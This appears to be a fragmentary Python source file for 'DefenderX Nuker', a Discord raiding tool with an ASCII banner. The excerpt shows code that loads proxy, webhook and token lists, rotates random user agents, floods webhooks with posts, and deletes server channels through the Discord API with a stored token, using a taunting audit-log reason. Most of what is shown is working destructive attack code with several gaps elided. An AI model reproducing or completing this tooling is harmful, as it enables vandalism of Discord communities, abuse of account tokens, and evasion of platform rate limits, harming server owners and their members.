...
System.Clear()
System.Title("WALTER - By Walter Papa")
lllll = ['proxies.txt', 'webhooks.txt', 'tokens.txt']
if not os.path.exists('./DefenderX'):
    os.system('md DefenderX')
    with open('./DefenderX/ useragents.txt', 'w') as file:
        ua = UserAgent()
        file.write('\n'.join([ua.random for _ in range(50)]))
elif os.path.exists('./DefenderX') and not os.path.exists('./DefenderX/useragents.txt'):
    with open('./DefenderX/useragents.txt', 'w') as file:
        ua = UserAgent()
        file.write('\n'.join([ua.random for _ in range(50)]))
else:
...
9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
    `9XXXXXXXXXXXP' `9XX'  DEFENDERX  `98v8P'  NUKER    `XXP' `9XXXXXXXXXXXP'
        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
...
def print_(text):
        Write.Print(f'\n     {text}', Colors.green_to_yellow, interval=0.01)
def input_():
...
def send_webhook(url=str, content=str, proxy=None):
    try:
        req.post(url=url,
                json={"content": content, "username": "DefenderX Nuker", "avatar_url": "https://media.discordapp.net/attachments/1054650838129332255/1153307620187312168/convert.png?width=402&height=402"}
                ,proxies=proxy)
        print_success(url)
...
def random_useragent():
    with open('./DefenderX/useragents.txt', 'r') as file:
            ...
            if r.status_code == 200:
                ...
                def delete(channel):
                    b = req.delete(url=f"https://discord.com/api/channels/{channel}",
                               headers={ "Authorization": tokens()[0],
                                        "X-Audit-Log-Reason": "By DefenderX Nuker",
                                        "User-Agent": random_useragent()})
